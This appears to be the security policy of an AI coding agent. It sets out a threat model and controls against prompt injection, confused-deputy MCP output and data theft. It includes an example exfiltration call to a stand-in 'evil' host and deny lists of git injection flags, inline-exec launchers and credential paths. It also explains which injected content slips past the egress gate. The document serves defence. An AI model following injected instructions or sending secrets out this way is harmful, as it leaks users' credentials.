# Security Policy

CoderAI is a terminal coding agent: it reads and writes files, runs commands,
fetches web pages, and talks to Model Context Protocol (MCP) servers on your
machine, with your credentials. That capability is the whole point — and also the
attack surface. This document describes the threat model, the controls that
enforce it, how to report a vulnerability, and the residual risks we know about.

## Reporting a vulnerability

Please report suspected vulnerabilities **privately**, not in a public issue or
pull request:

- Use GitHub's **"Report a vulnerability"** button under the repository's
  **Security** tab (private vulnerability reporting), or
- open a minimal private channel with the maintainer before any public
  disclosure.

Include a description, affected version/commit, and a minimal reproduction. We
aim to acknowledge a report within a few days and to coordinate a fix and
disclosure timeline with you. Please give us a reasonable window to ship a fix
before public disclosure.

Out of scope: findings that require an already-compromised host, a malicious
local user with your privileges, or disabling the safeguards below on purpose
(e.g. `--yolo`, `CODERAI_ALLOW_OUTSIDE_PROJECT=1`, `--trust-workspace`).

## Threat model

**Principal threat:** *untrusted input must never drive privileged local
execution without an explicit human trust decision.* Untrusted input includes a
cloned repository's `.coderAI/*` overlay, fetched web pages, and MCP server
output — none of it is authored by you, so none of it may act with your
authority.

Design principles the codebase holds to:

1. **Deny by default / fail closed.** When a check can't be evaluated (missing
   config, unreadable trust store), the safe answer is "no."
2. **Data is never instructions.** Content ingested from outside your own input
   is fenced as data and cannot silently escalate to a tool call.
3. **Child capabilities ⊆ parent.** A delegated sub-agent can never do more than
   the agent that spawned it.
4. **Hard-stops survive approval.** A handful of always-on refusals (argv
   blocklist, protected paths, SSRF) are not reachable by "always allow" or
   `--yolo`.
5. **Every fix ships a red-team test.** Regressions are caught by the
   `tests/security/` corpus (run `make test-security` / `pytest -m security`),
   which is a **required, blocking CI job**.

## Controls

### Workspace trust boundary (`coderAI/system/trust.py`)

A freshly cloned or newly opened project is **untrusted** until you say
otherwise. While untrusted, repo-supplied `.coderAI/hooks.json`, config overlays,
personas, skills, and `permission: ask` rules are **not** honoured — a malicious
repo cannot register a hook or inject agent guidance on your first message.
User-scoped personas/skills and immutable built-ins installed inside the wheel
remain available. Their deterministic precedence is project → user → builtin,
and discovery rejects symlinks that resolve outside the selected scope. The
trust decision is
fingerprinted per workspace, stored fail-closed, and made explicitly via the
`/trust` command or the `--trust-workspace` flag.

Built-in Markdown is part of the signed/attested distribution supply chain, not
project content: the release pipeline builds once, probes that exact wheel from
an empty directory, and promotes the same artifact to GitHub and PyPI. A package
integrity failure is fatal rather than falling back to files from a source
checkout.

### Provenance & egress gating (`coderAI/core/provenance.py`)

Tool results that ingest outside data (web fetch, MCP output) are tagged
`UNTRUSTED_EXTERNAL` and rendered to the model inside a non-authoritative
`<untrusted_tool_output>` fence. Ingesting such content **taints the turn**:

- Any **network-egress** tool then requires confirmation for the rest of the
  turn — even a read-only, allowlisted one — so an injected page can't coax a
  follow-up `read_url("https://evil/?leak=SECRET")` exfiltration.
- Ingesting **MCP output** additionally forces a human decision before any local
  *mutating* tool runs, **even under `--yolo`** (a third-party server must not
  drive an unattended local write/exec).

### Permission model (`coderAI/core/permissions.py`)

Confirmation-by-default: a mutating tool that doesn't explicitly opt out with
`safe = True` requires confirmation, and a tool that fails to classify itself is
treated as dangerous. High-risk tools (`run_command`, `write_file`,
`delete_file`, …) refuse a blanket "always allow" — approvals are per-call or
scoped to a reviewed command prefix / path subtree. Static MCP relay tools
(`mcp__server__tool` proxies, `mcp_read_resource`, `mcp_get_prompt`, …) declare
`mcp_source = True` so they share the same confused-deputy mutation gate as
dynamic `mcp__<server>__<tool>` proxies.

### Plan Mode boundary (`coderAI/core/planning.py`, `tool_executor.py`)

Planning is an enforced capability boundary, not a prompt convention. During a
planning turn, schema routing exposes only native read tools, explicitly
read-only delegation, and `submit_plan`; dynamic MCP tools are absent. The
executor repeats the check for invented tool calls. Project hooks, MCP
autolaunch, and workspace-trust actions are suppressed for the entire turn.

Plan state is the one intentional internal write: project-scoped artifacts live
under `.coderAI/plans/`. Immutable revision snapshots cannot be symlink leaves.
The mutable `draft.json` must remain inside the project even when the general
outside-project escape hatch is enabled; stale, malformed, wrong-plan, and
unapplied drafts cannot be approved. Approval hashes one immutable snapshot and
execution rechecks the hash.

If implementation must diverge, `request_plan_amendment` records a complete new
revision, invalidates approval, and switches the rest of the turn back to the
read-only boundary. The executor also reloads the active record before every
mutating call, so an amendment from another process stops the old execution.
Restoring session metadata does not itself authorize continuation: mutations
remain blocked until `/plan resume` or `coderAI plan execute` explicitly
reactivates the approved execution.

### Execution hard-stops and OS sandbox (`coderAI/system/proc.py`, `sandbox.py`)

An argv-level command blocklist and interactive-command detector run before any
process spawn. Terminal, REPL, build/test/lint/format/package, and git commands
have credential-like environment variables scrubbed and run in isolated process
groups; project hooks receive a stricter allowlisted environment. The
package-manager tool constrains sources/flags, and git argument injection
(`--upload-pack`, `-o`) is neutralised with `--`.

An optional OS sandbox applies at the shared subprocess boundary and to the
Python REPL, background commands, trusted workspace hooks, and MCP stdio
servers. Linux uses Bubblewrap when its capability probe succeeds; macOS uses
`sandbox-exec` when available. When active, the host filesystem is readable,
the project workspace and system temporary directories are writable, other
writes are denied, and network access is denied unless explicitly enabled.
Wrappers are argv lists, not nested shell strings.

`sandbox_mode` defaults to `off` for compatibility. `best_effort` warns with
the words `running unconfined` when no backend is usable and then falls back;
`required` fails closed before launching. Set these with
`CODERAI_SANDBOX_MODE=off|best_effort|required`. Network can be restored for
sandboxed package downloads or networked MCP servers with
`CODERAI_SANDBOX_ALLOW_NETWORK=1`. Neither `off` nor a best-effort fallback is
confinement.

### MCP / OAuth trust (Phase 7)

- **HTTPS only** for remote MCP transports and every OAuth
  discovery/token/registration/revocation endpoint, with a loopback dev
  exception (`127.0.0.1`/`localhost`).
- A **single launcher-validation choke point** (`connect_stdio`) enforces the
  launcher allow-list, an inline-exec block (`python -c`, `node -e`,
  `deno eval`), and the command blocklist for **both** the `mcp_connect` tool and
  config-driven autoconnect — a server planted in `mcp_servers.json` or
  `.mcp.json` is held to the same bar. Project `.mcp.json` is ignored until
  workspace trust + per-server approval.
- The OAuth authorization-server origin is shown before the browser opens, with a
  warning when it differs from the MCP server's registrable domain.

### Filesystem & secret-at-rest hygiene (Phase 8)

- A protected-path denylist (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config`,
  `~/.bashrc`/`~/.zshrc`/`~/.profile`, `~/.netrc`/`~/.npmrc`/`~/.pypirc`,
  `~/.gitconfig`, and `~/.coderAI` itself) is refused by the mutating filesystem
  tools **even with the project-scope sandbox disabled**.
- Symlink leaves are refused and files are opened with `O_NOFOLLOW`, closing
  symlink-swap TOCTOU escapes of the project scope. Metadata mutators
  (`file_chmod` / `file_chmod`) use fd-based no-follow on POSIX; `file_stat`
  and `file_readlink` enforce project scope.
- Secrets at rest are owner-only (0600) in owner-only directories (0700): API
  keys, OAuth credentials, session history, and undo backups. Undo/rewind
  backups are selected from the executing agent's immutable, session-bound
  run context; concurrent or resumed subagents do not select recovery state
  through the mutable global history cursor.
- Approved synchronous mutations also receive an owner-only transaction ledger
  under `~/.coderAI/transactions/<session-id>`. Pre-operation contents and modes
  are snapshotted before hooks execute; post-hook hashes record native and
  foreground-shell changes even on tool failure. Rollback checks that the
  current path still matches the recorded post-state, then reapplies project
  scope, protected-path, and symlink-leaf guards. Conflicts and incomplete scans
  fail closed as retryable partial failures. Parent/child session and workspace
  identities are revalidated before record, recovery, or rollback.
- Session files are
  written atomically via `mkstemp` so there is never a world-readable window.

### Supply chain (Phase 9)

- Dependencies resolve to a pinned, hashed `requirements.lock` (regenerate with
  `make lock`). `make audit` and a (non-blocking) CI step run
  `pip-audit --strict` against it; Dependabot is configured for update PRs.
- `pre-commit` runs ruff/mypy locally; CI runs format, lint, strict-per-module
  mypy, the coverage-gated test suite, and the blocking security suite.
- Release versions have one source in `coderAI/_version.py`; publishing requires
  an exact matching `v<version>` tag. The workflow builds and attests once,
  probes the downloaded wheel (including every optional extra), and makes any
  already-published PyPI version a hard failure. Manual candidate runs never
  publish.

## Known residual risks

We prefer to document these honestly rather than imply a stronger guarantee than
the code provides:

- **The OS sandbox is opt-in and not a confidentiality boundary.** The default
  `off` mode and an unavailable `best_effort` backend run unconfined. Even when
  active, host files remain readable so language runtimes and toolchains work;
  temporary directories are writable. The control is intended to stop
  outside-workspace mutation and network access, not to hide readable host data.
- **Sandbox availability is platform-dependent.** Linux needs a working
  Bubblewrap installation and user-namespace support. macOS needs the deprecated
  but still shipped `sandbox-exec` facility. Windows has no backend and therefore
  needs `off` or `best_effort`; `required` fails closed.
- **MCP stdio env is scrubbed, then overlaid.** Stdio servers start from a
  scrubbed environment (host API keys stripped) and only receive keys listed in
  the server's config ``env`` map (with ``${VAR}`` expansion). Treat configured
  MCP launchers and their env overlays as trusted; enable the OS sandbox to
  restrict their writes and network access when compatible with the server.
  Project ``.mcp.json`` servers are ignored until the workspace is trusted and
  each server is approved.
- **Some read tools are deliberately `TRUSTED`.** `read_file`, `grep`,
  `semantic_search`, and terminal *stdout* are not provenance-tainted, on the
  assumption that project source is content you chose to open. A repository whose
  source files contain prompt-injection payloads is therefore not fenced by the
  egress gate the way a fetched web page is — review untrusted code before acting
  on what the agent says about it. (Flipping any of these to
  `UNTRUSTED_EXTERNAL` is a one-line change if your threat model requires it.)
- **`download_file` uses an executable *denylist*, not an allowlist.** It refuses
  known executable/script extensions and content-types, but a novel runnable
  format could slip through; downloaded files are still data you must review
  before executing.
- **Windows permission hardening is best-effort.** `restrict_fd`/`restrict_path`
  are no-ops on Windows (no POSIX mode bits); secret-at-rest confidentiality
  there relies on the default per-user ACLs of the `%USERPROFILE%` profile
  directory.
- **Broad protected paths trade usability for safety.** `~/.config` is protected
  wholesale, so the agent cannot edit application configs living there; do such
  edits yourself or move the file into the project.
- **Transaction coverage is synchronous and workspace-focused.** A background
  process may mutate after its launching tool returns, and Git metadata under
  `.git` is intentionally excluded from snapshots. Mutating delegated agents
  still share the project worktree until isolated patch integration lands.
  Transaction snapshots also have no retention/incremental-object policy yet,
  so long sessions can consume substantial disk space.

## Supported platforms

| Platform | Status |
|---|---|
| Linux | Fully supported (CI blocking) |
| macOS | Fully supported (CI blocking) |
| Windows | Best-effort — CI runs experimentally (`continue-on-error`); secret-at-rest hardening is ACL-based rather than POSIX mode bits |

Desktop automation tools (`run_applescript`, Accessibility) are macOS-only.

## Supported versions

CoderAI is pre-1.0 and ships from `main`. Security fixes land on `main`; there is
no separate long-term support branch. Run a recent commit.
